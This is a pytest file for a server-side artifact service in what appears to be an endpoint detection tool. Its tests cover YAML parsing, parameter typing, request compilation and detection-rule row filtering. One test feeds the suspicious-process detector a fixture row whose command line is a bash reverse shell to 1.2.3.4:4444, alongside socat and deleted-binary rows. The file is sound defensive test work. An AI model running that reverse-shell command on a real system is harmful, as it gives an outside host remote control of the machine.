# tests/server-api/test_flow_artifacts.py
import pytest

from app.services.flow_artifacts import (
    ArtifactError, build_row_filter, builtin_artifacts, column_order, compile_request,
    parse_artifact, resolve_params,
)

CUSTOM = """
name: Custom.Linux.TmpProcs
description: procs from tmp
parameters:
  - name: Prefix
    default: /tmp/
  - name: Limit
    type: int
    default: 10
  - name: Deep
    type: bool
    default: false
sources:
  - name: Procs
    plugin: pslist
    args:
      limit: "{{Limit}}"
      deep: "{{Deep}}"
      label: "prefix={{Prefix}}"
    detection:
      selection:
        Exe|startswith: "{{Prefix}}"
      condition: selection
    fields: [Pid, Exe]
  - name: Everything
    plugin: users
resources:
  timeout: 120
  max_rows: 50
"""


def test_every_builtin_artifact_parses_and_compiles():
    arts = builtin_artifacts()
    assert "Linux.Sys.Pslist" in arts and "Linux.Detection.SuspiciousProcesses" in arts
    for art in arts.values():
        params = resolve_params(art, {})
        req = compile_request(art, "f1", params, art.timeout, art.max_rows, yara_rules=[])
        assert [s["name"] for s in req["sources"]] == [s.name for s in art.sources]
        build_row_filter(art.content, params)


def test_params_are_typed_and_substituted_into_the_request():
    art = parse_artifact(CUSTOM)
    params = resolve_params(art, {"Limit": "25", "Deep": "true"})
    assert params == {"Prefix": "/tmp/", "Limit": 25, "Deep": True}
    req = compile_request(art, "flow-1", params, art.timeout, art.max_rows)
    assert req == {
        "id": "flow-1", "artifact": "Custom.Linux.TmpProcs", "timeout": 120, "max_rows": 50,
        "sources": [
            {"name": "Procs", "plugin": "pslist", "args": {"limit": 25, "deep": True, "label": "prefix=/tmp/"}},
            {"name": "Everything", "plugin": "users", "args": {}},
        ],
    }
    # detection stays server-side
    assert "detection" not in str(req)


def test_row_filter_applies_detection_with_params_and_projects_fields():
    art = parse_artifact(CUSTOM)
    filt = build_row_filter(art.content, resolve_params(art, {"Prefix": "/dev/shm/"}))
    rows = [
        {"Pid": 1, "Exe": "/usr/sbin/sshd", "Name": "sshd"},
        {"Pid": 2, "Exe": "/dev/shm/x", "Name": "x"},
        {"Pid": 3, "Exe": "/tmp/y", "Name": "y"},
    ]
    assert filt.apply("Procs", rows) == [{"Pid": 2, "Exe": "/dev/shm/x"}]
    # unfiltered source keeps rows untouched
    assert filt.apply("Everything", [{"Username": "root"}]) == [{"Username": "root"}]
    with pytest.raises(ArtifactError):
        filt.apply("Nope", rows)


def test_suspicious_processes_artifact_flags_the_right_rows():
    art = builtin_artifacts()["Linux.Detection.SuspiciousProcesses"]
    filt = build_row_filter(art.content, resolve_params(art, {}))
    rows = [
        {"Pid": 10, "Name": "sshd", "Exe": "/usr/sbin/sshd", "CommandLine": "sshd -D"},
        {"Pid": 11, "Name": "kworker", "Exe": "/tmp/.x/kworker", "CommandLine": "kworker"},
        {"Pid": 12, "Name": "bash", "Exe": "/usr/bin/bash", "CommandLine": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"},
        {"Pid": 13, "Name": "SOCAT", "Exe": "/usr/bin/socat", "CommandLine": "socat"},
        {"Pid": 14, "Name": "python3", "Exe": "/usr/bin/python3 (deleted)", "CommandLine": "python3"},
    ]
    assert [r["Pid"] for r in filt.apply("Suspicious", rows)] == [11, 12, 13, 14]


@pytest.mark.parametrize("mutate,fragment", [
    (lambda c: c.replace("name: Custom.Linux.TmpProcs", "name: x"), "name must be"),
    (lambda c: c.replace("plugin: pslist", "plugin: shell"), "unknown plugin"),
    (lambda c: c.replace("condition: selection", "condition: selection and missing"), "unknown selection"),
    (lambda c: c.replace("Exe|startswith", "Exe|bogus"), "unsupported modifier"),
    (lambda c: c.replace("type: int", "type: float"), "type must be"),
    (lambda c: c.replace("default: 10", "default: ten"), "must be int"),
    (lambda c: c.replace("timeout: 120", "timeout: 99999"), "resources.timeout"),
    (lambda c: c.replace('label: "prefix={{Prefix}}"', 'label: "{{Nope}} x"'), "no matching parameter"),
    (lambda c: c.replace("name: Everything", "name: Procs"), "unique"),
    (lambda c: c + "type: SERVER\n", "CLIENT"),
])
def test_invalid_artifacts_are_rejected(mutate, fragment):
    with pytest.raises(ArtifactError) as exc:
        parse_artifact(mutate(CUSTOM))
    assert fragment in str(exc.value)


def test_unknown_or_badly_typed_flow_params_are_rejected():
    art = parse_artifact(CUSTOM)
    with pytest.raises(ArtifactError, match="unknown parameter"):
        resolve_params(art, {"Typo": 1})
    with pytest.raises(ArtifactError, match="must be bool"):
        resolve_params(art, {"Deep": "maybe"})


def test_columns_follow_fields_then_plugin_order():
    art = parse_artifact(CUSTOM)
    # JSONB hands keys back reordered; display order comes from the artifact
    assert column_order(art.content, "Procs", [{"Exe": "/x", "Pid": 1}]) == ["Pid", "Exe"]
    users = builtin_artifacts()["Linux.Sys.Users"]
    rows = [{"Uid": "0", "Shell": "/bin/sh", "Extra": 1, "Username": "root"}]
    assert column_order(users.content, "Users", rows) == ["Username", "Uid", "Shell", "Extra"]


def test_yara_rules_are_injected_only_when_not_given():
    art = builtin_artifacts()["Linux.Detection.Yara"]
    rules = [{"id": "1", "name": "r", "content": "rule r { condition: true }"}]
    req = compile_request(art, "f", resolve_params(art, {"Path": "/srv"}), 60, 10, yara_rules=rules)
    assert req["sources"][0]["args"] == {"path": "/srv", "recursive": True, "rules": rules}
